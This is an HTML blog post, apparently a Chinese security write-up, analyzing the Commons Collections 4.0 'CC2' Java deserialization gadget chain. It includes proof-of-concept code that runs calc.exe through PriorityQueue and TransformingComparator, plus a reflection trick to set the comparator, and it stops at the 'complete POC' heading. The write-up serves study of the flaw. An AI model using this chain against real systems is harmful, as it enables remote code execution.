@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+    <meta charset="UTF-8">
+    
+    <link rel="apple-touch-icon" sizes="76x76" href="/null">
+    <link rel="icon" type="image/png" href="/null">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <title>Java  Commons Collection 2分析 - Hexo</title>
+    
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    
+    
+    <meta name="description" content="">
+    <meta name="author" content="John Doe">
+    <meta name="keywords" content="">
+    <style>
+
+
+    
+    :root{
+        --shadow-color: rgba(0,0,0,0.2);
+        --sec-shadow: rgba(0,0,0,0.03);
+        --shadow-hover-color: rgba(0,0,0,0.28);
+        --first-text-color: #475b6d;
+        --second-text-color: #37475b;
+        --third-text-color: #858585;
+        --default-text-color: #505050;
+        --default-link-color: #007bff;
+        --link-color: #000000;
+        --second-link-color: #4F9BFA;
+        --code-color:rgba(27,31,35,.05);
+        --post-bkg-color: #fff;
+        --page-bkg-color: #f2f5f8;
+        --nav-a-hover-color: #3498db;
+        --post-sec-text-color: #718096;
+        --sec-bkg: #f2f5f8;
+        --color-mode: 'light';
+        --bkg-h: rgba(255,255,255,0.6);
+        --bkg-m: #e1e4e8;
+        --home-title-color: #4169E1;
+        --shadow: 0 4px 10px rgba(0,2,4,0.06),0 0 1px rgba(0,2,4,0.11);
+        --hr-color: #ddd;
+        --bg-t: #f4f4f4;
+        --nav-bkg: rgba(255,255,255,0.6);
+    }
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-mode: 'dark';
+  }
+
+  :root:not([data-theme]) {
+    --first-text-color: hsla(0,0%,100%,0.92);
+    --second-text-color: hsla(0,0%,100%,0.86);
+    --third-text-color: #a7a9ad;
+    --default-text-color: #505050;
+    --default-link-color: #1589e9;
+    --link-color: #000000;
+    --second-link-color: #30a9de;
+    --post-bkg-color: #252d38;
+    --page-bkg-color: #181c27;
+    --nav-a-hover-color: #3498db;
+    --post-sec-text-color: #a7a9ad;
+    --sec-bkg: #364151;
+    --bkg-h: rgba(255,255,255,0.2);
+    --bkg-m: rgba(255,255,255,0.1);
+    --home-title-color: rgb(226, 82, 90);
+    --code-color:#3e4b5e;
+    --shadow: none;
+    --hr-color: #718096;
+    --bg-t: #364151;
+    --nav-bkg: rgba(13,17,23,0.6);
+  }
+}
+
+[data-theme='dark'] {
+    --shadow-color: rgba(0,0,0,0.2);
+    --shadow-hover-color: rgba(0,0,0,0.28);
+    --first-text-color: hsla(0,0%,100%,0.92);
+    --second-text-color: hsla(0,0%,100%,0.86);
+    --third-text-color: #a7a9ad;
+    --default-text-color: #505050;
+    --default-link-color: #1589e9;
+    --link-color: #000000;
+    --second-link-color: #30a9de;
+    --post-bkg-color: #252d38;
+    --page-bkg-color: #181c27;
+    --nav-a-hover-color: #3498db;
+    --post-sec-text-color: #a7a9ad;
+    --sec-bkg: #364151;
+    --bkg-h: rgba(255,255,255,0.2);
+    --bkg-m: rgba(255,255,255,0.1);
+    --home-title-color: rgb(226, 82, 90);
+    --code-color:#3e4b5e;
+    --shadow: none;
+    --hr-color: #718096;
+    --bg-t: #364151;
+    --nav-bkg: rgba(13,17,23,0.6);
+}
+
+</style>
+
+
+
+<style>
+#page-main,footer,.p-btn{
+    display: none;
+}
+html,body{
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    overflow-y: overlay;
+}
+body{
+    background-color: var(--page-bkg-color);
+    color: var(--second-text-color);
+    overflow-y: scroll;
+}
+a {
+    color: var(--default-link-color);
+    text-decoration: none;
+    background-color: transparent;
+}
+a:hover{
+    color: var(--second-link-color);
+}
+.main-content,.post-card-main{
+    margin: 30px;
+}
+
+
+
+@media (max-width: 410px){
+    .post-card-main{
+        max-width: 350px!important;
+    }
+}
+
+@media (max-width: 980px){
+    .post-card-main{
+        max-width: 520px!important;
+    }
+}
+
+
+@media (min-width: 780px){ 
+    h3{
+        font-size: 1.5rem;
+        line-height: 1.5em;
+    }
+}
+@media (min-width: 1280px){ 
+    h3{
+        font-size: 1.7rem;
+        line-height: 1.5em;
+    }
+}
+@media (min-width: 2096px){ 
+    h3{
+        font-size: 1.8rem;
+        line-height: 1.5em;
+    }
+}
+
+.text-center{
+    text-align: center!important;
+}
+.middle-center{
+    display: -webkit-box;
+    display: -ms-flexbox;
+    display: flex;
+    -webkit-box-align: center;
+    -ms-flex-align: center;
+    align-items: center;
+    -webkit-box-pack: center;
+    -ms-flex-pack: center;
+    justify-content: center;
+    height: 100%;
+}
+header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: fixed;
+    height: 54px;
+    padding: 0 1.25rem;
+    top: 0;
+    left: 0;
+    right: 0;
+    z-index: 10;
+    border-bottom: 1px solid var(--bkg-m);
+    background-color: var(--nav-bkg);
+}
+header .header__left, header .header__right {
+    display: flex;
+    align-items: center;
+    font-family: rubik,sans-serif,Varela Round;
+}
+header .header__left .logo__text {
+    font-size: 18px;
+    font-weight: 450;
+    padding: 14.5px 10px;
+    border-radius: 5px;
+    color: var(--second-text-color);
+}
+header .header__right .navbar__menus {
+    height: 54px;
+    padding: 0 0 0 15px;
+}
+header .header__right .button {
+    color: var(--second-text-color);
+}
+header .header__right .navbar__menus .navbar-menu {
+    display: inline-block;
+    align-items: center;
+    height: 54px;
+    padding: 0 10px;
+    font-size: 16px;
+    line-height: 54px;
+}
+header .header__right .dropdown-icon {
+    display: none;
+    height: 54px;
+    padding: 15px 10px;
+    border: 0;
+    background-color: transparent;
+}
+header .header__right .dropdown-menus {
+    line-height: 2rem;
+    animation: slide-in .15s ease 1;
+    display: none;
+    position: absolute;
+    left: 12px;
+    right: 12px;
+    top: calc(54px + 10px);
+    border-radius: 6px;
+    padding: 24px;
+    background-color: var(--page-bkg-color);
+    border: 1px solid var(--bkg-m);
+    z-index: 9999;
+    justify-items: center;
+    justify-content: center;
+    flex-direction: column;
+}
+header .header__right #btn-search, header .header__right #btn-toggle-dark{
+    display: inline-block;
+    padding:  18px 10px;
+    height: 25px;
+}
+header .header__right #btn-dropdown{
+  display: inline-block;
+  padding:  13.5px 0;
+}
+header .header__right .dropdown-menus .dropdown-menu {
+    padding: 10px;
+    color: var(--second-text-color);
+}
+@media screen and (max-width: 764px){
+.navbar__menus {
+    display: none!important;
+}
+.dropdown-icon {
+    display: inline-block!important;
+}
+}
+.p-btn{
+    position: fixed;
+    bottom: 1.2rem;
+    right: 1.2rem;
+    contain: layout;
+}
+.toc-btn,.click-btn{
+    cursor: pointer;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    align-items: center;
+    margin-top: .5rem;
+    font-size: .75rem;
+    background-color: var(--sec-bkg);
+    display: block;
+    padding: 0.9rem;
+    box-shadow: 0 0.3rem 0.6rem rgba(48,55,66,.15);
+    border: none;
+    border-radius: 0.5rem;
+    line-height: 1;
+    color: var(--first-text-color);
+}
+.toc-link{
+    color: var(--second-text-color);
+}
+
+#css-loading h3{
+    font-weight: 500;
+    font-size: 1.4rem;
+    text-align: center;
+    position: fixed;
+    top: 200px;
+    left: 0;
+    right: 0;
+    opacity: 0;
+    animation: cssLoad;
+    animation-delay: 0.3s;
+    -webkit-animation: cssLoad;
+    -webkit-animation-delay: 0.3s;
+}
+@keyframes cssLoad {
+    from {
+        opacity: 0;
+    }
+    to {
+        opacity: 0.9;
+    }
+}
+
+
+.memorial {
+    -webkit-filter: grayscale(100%);
+    -moz-filter: grayscale(100%);
+    -ms-filter: grayscale(100%);
+    -o-filter: grayscale(100%);
+    filter: grayscale(100%);
+    filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); filter:gray;
+}
+
+
+    .post-copyright:after {
+        position: absolute;
+        color: #fff;
+        background: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 496 512'%3E%3Cpath fill='gray' d='M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z'/%3E%3C/svg%3E");
+        content: ' ';
+        height: 10rem;
+        width: 10rem;
+        right: -2rem;
+        top: -2rem;
+        opacity: .1;
+    }
+
+</style>
+
+    
+
+    
+        <!--
+        <link rel="stylesheet" href="/css/page.css" media="print"
+            onload="this.media='all';this.onload=null">
+        <noscript>-->
+            <link rel="stylesheet" href="/css/page.css">
+        <!--</noscript>-->
+    
+    
+    <link rel="stylesheet" href="/css/main.css" media="print" onload="this.media='all';this.onload=null">
+    <noscript>
+        <link rel="stylesheet" href="/css/main.css">
+    </noscript>
+
+    
+    <script src="/js/main.js"></script>
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <body>
+        <header>
+            
+<div class="header__left">
+	<a href="/" class="button"><span class="logo__text">blckder02</span></a>
+</div>
+<div class="header__right">
+	<div class="navbar__menus">
+		
+		<a href="/" class="button">
+			<div class="navbar-menu">首页</div>
+		</a>
+		
+		<a href="/archives/" class="button">
+			<div class="navbar-menu">归档</div>
+		</a>
+		
+		<a href="/categories/" class="button">
+			<div class="navbar-menu">分类</div>
+		</a>
+		
+		<a href="/about/" class="button">
+			<div class="navbar-menu">关于</div>
+		</a>
+		
+	</div>
+	
+	<a href="/search/" class="button">
+		<div id="btn-search">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
+				stroke="currentColor" stroke-width="32">
+				<path
+					d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z">
+				</path>
+			</svg>
+		</div>
+	</a>
+	
+	<a href="javaScript:void(0);" class="button" id="btn-toggle-dark">
+		<div>
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none"
+				stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+				<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+			</svg>
+		</div>
+	</a>
+	<a href="javaScript:void(0);" class="dropdown-icon button">
+		<div id="btn-dropdown">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
+				stroke="currentColor" stroke-width="32" stroke-linecap="round">
+				<path
+					d="M903.43 561.52H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 204.31H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 918.73H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24z"
+					fill="currentColor"></path>
+			</svg>
+		</div>
+	</a>
+	<div class="dropdown-menus" id="dropdown-menus">
+		
+		<a href="/" class="dropdown-menu button">首页</a>
+		<br>
+		
+		<a href="/archives/" class="dropdown-menu button">归档</a>
+		<br>
+		
+		<a href="/categories/" class="dropdown-menu button">分类</a>
+		<br>
+		
+		<a href="/about/" class="dropdown-menu button">关于</a>
+		<br>
+		
+	</div>
+</div>
+
+        </header>
+        <div id="top"></div>
+        <div id="page-main" class="main-content">
+        <div class="mg-top">
+            
+
+<article class="page">
+<div id="post-meta-m">
+    <div class="post-meta" id="post-meta">
+  <h3>Java  Commons Collection 2分析</h3>
+    
+      <span class="post-meta-label">
+        John Doe
+      </span>
+    
+    
+      <span class="post-meta-label">
+        <span class="p-dot"></span>
+        <time datetime="2022-09-18 21:41" pubdate>
+          2022-09-18
+        </time>
+      </span>
+    
+    
+      
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        共 3.5k 字
+      </span>
+    
+    
+    
+  </div>
+  
+</div>
+<div class="article-m">
+  <div class="post-toc">
+    
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE1%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">利用链1分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC1%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">POC1分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Javassit%E8%A1%A5%E5%85%85"><span class="toc-number">4.</span> <span class="toc-text">Javassit补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE2%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">利用链2分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">小结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE1"><span class="toc-number">6.1.</span> <span class="toc-text">利用链1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE2"><span class="toc-number">6.2.</span> <span class="toc-text">利用链2</span></a></li></ol></li></ol>
+    
+  </div>
+    <div id="article">
+      <div id="post-content" class="markdown-body textretty">
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>CC2使用的是<code>javassist</code>和<code>PriorityQueue</code>来构造利用链；<br>并且使用的是<code>commons-collections-4.0</code>版本，该版本删除了<code>lazyMap</code>的<code>decode</code>方法，所以CC1不用4.0版本；<br>而3.1-3.2.1版本中<code>TransformingComparator</code>并没有去实现<code>Serializable</code>接口，也就是说这是不可以被序列化的，所以CC2不用3.x版本。</p>
+<p>在<code>pom.xml</code>中添加：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用链</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">			PriorityQueue.readObject()</span><br><span class="line">				...</span><br><span class="line">					TransformingComparator.compare()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用链1分析"><a href="#利用链1分析" class="headerlink" title="利用链1分析"></a>利用链1分析</h2><p>跟着利用链，首先看看<code>PriorityQueue.readObject()</code><br><img src="/./images/1629965013089.png" alt="enter description here">[1]</p>
+<p>这里的<code>queue[i]</code>是从<code>readObject</code>得到的，再看看<code>writeObject</code>；<br><img src="/./images/1629965132534.png" alt="enter description here">[2]</p>
+<p><code>writeObject</code>中依次将<code>queue[i]</code>进行序列化，那么我们通过反射实例化PriorityQueue类的对象，给<code>queue[i]</code>赋值，就实现了对<code>queue[i]</code>的控制。</p>
+<p>最后调用了<code>heapify</code>方法，跟进：<br><img src="/./images/1629965484208.png" alt="enter description here">[3]</p>
+<p>当<code>i&gt;=0</code>时进入for循环，而<code>i=(size &gt;&gt;&gt; 1) -1</code>将size进行了右移操作，所以<code>size&gt;1</code>才能进入循环。</p>
+<p>再跟进<code>siftDown</code>方法：<br><img src="/./images/1629965664185.png" alt="enter description here">[4]</p>
+<p>x就是<code>queue[i]</code>，跟进<code>siftDownUsingComparator</code>方法：<br><img src="/./images/1629966390999.png" alt="enter description here">[5]</p>
+<p>重点在<code>comparator.compare(x, (E) c)</code>；<br>跟进可以看到<code>Comparator</code>是一个接口，compare是它的抽象方法；<br><img src="/./images/1629966826631.png" alt="enter description here">[6]</p>
+<p>CC2利用链中<code>TransformingComparator</code>类实现了compare方法；<br><img src="/./images/1629967095162.png" alt="enter description here">[7]</p>
+<p>该方法中调用了<code>this.transformer.transform()</code>方法，看到这里，就有点熟悉了，<code>this.transformer</code>又是我们可控的，后面的理解和CC1差不多了。</p>
+<h2 id="POC1分析"><a href="#POC1分析" class="headerlink" title="POC1分析"></a>POC1分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">Tcomparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>, Tcomparator);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc2.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            System.out.println(barr.toString());</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc2.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>代码1</strong><br>通过反射获取Runtime对象；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+<p><strong>代码2</strong><br>当调用ChainedTransformer的transformer方法时，对transformers数组进行回调，从而执行命令；<br>将transformerChain传入TransformingComparator，从而调用transformer方法；<br>new一个PriorityQueue对象，传入一个整数参数，且传入的数值不能小于1，再将Tcomparator传入。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">Tcomparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>, Tcomparator);</span><br></pre></td></tr></table></figure>
+<p><strong>代码3</strong><br>前面说到，size的值要大于1，所以向queue中添加两个元素。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+<p>添加上序列化和反序列化代码后，能成功执行命令，但是没有生成序列化文件，也就是没有<code>cc2.txt</code>。</p>
+<p>调试代码看一看，跟进<code>PriorityQueue</code>类，这里comparator参数是我们传入的<code>Tcomparator</code>；<br><img src="/./images/1630139690470.png" alt="enter description here">[8]</p>
+<p>继续跟，跟进<code>queue.add(2)</code>，调用了<code>offer</code>方法；<br><img src="/./images/1630139841340.png" alt="enter description here">[9]</p>
+<p>跟进<code>offer</code>方法，进入else分支，调用了<code>siftUp</code>方法；<br><img src="/./images/1630139895026.png" alt="enter description here">[10]</p>
+<p>跟进<code>siftUp</code>方法，comparator参数不为null，进入if分支，调用<code>siftUpUsingComparator</code>方法；<br><img src="/./images/1630139995195.png" alt="enter description here">[11]</p>
+<p>继续跟，来到重点代码；<br><img src="/./images/1630140093082.png" alt="enter description here">[12]</p>
+<p>跟进，这里会执行两次命令；<br><img src="/./images/1630140223405.png" alt="enter description here">[13]</p>
+<p>但是return的值为0，程序就结束了，并没有执行POC后面序列化和反序列化的代码。</p>
+<p>那么如何让return不为0呢。<br>既然调用<code>siftUpUsingComparator</code>方法会出错，那试试调用<code>siftUpComparable</code>方法，即comparator参数为null，修改代码，不传入comparator参数。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>再调试看看；<br>这下comparator参数就为null；<br><img src="/./images/1630140989078.png" alt="enter description here">[14]</p>
+<p>照样进入<code>queue.add(2)</code>，到<code>siftUp</code>方法，就进入else分支，调用<code>siftUpComparable</code>方法；<br><img src="/./images/1630141082321.png" alt="enter description here">[15]</p>
+<p>这样就只是单纯给<code>queue[1]</code>赋值，并不会调用<code>compare</code>方法；<br><img src="/./images/1630141345200.png" alt="enter description here">[16]</p>
+<p>返回后就执行序列化代码，但是并没有执行命令，还要改进；</p>
+<p><strong>代码4</strong><br>上面修改后的代码没有调用到<code>compare</code>方法，我们可以在向queue中添加元素后，通过反射将<code>Tcomparator</code>传入到queue的comparator参数；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> field.set(queue,Tcomparator);</span><br></pre></td></tr></table></figure>
+<p>这样comparator参数就不为null，当反序列化时调用<code>readObject</code>方法时就会进入<code>siftDownUsingComparator</code>方法，调用<code>compare</code>方法，从而执行命令。<br><img src="/./images/1630826157264.png" alt="enter description here">[17]</p>
+<p><strong>完整POC</strong></p>
